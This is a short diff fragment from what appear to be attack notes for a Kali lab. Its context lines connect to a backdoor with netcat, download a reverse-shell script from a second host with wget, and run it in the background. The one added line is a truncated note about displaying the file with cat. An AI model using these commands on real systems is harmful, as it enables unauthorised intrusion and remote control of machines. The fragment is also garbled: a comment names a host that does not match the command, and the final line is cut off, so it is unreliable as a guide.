@@ -17,3 +17,5 @@ kali-CMD5  nc 192.168.1.100 6200                          #Connecting into the b
            wget 192.168.1.101:8080/reverseShell.py        #Starts the reverse shell on the external machine 192.168.1.100
 
            python reverseShell.py 192.168.1.101 &         #It will now connect to the server
+
+[cat displays the file in CMD] Example: cat reverseShell.py       [
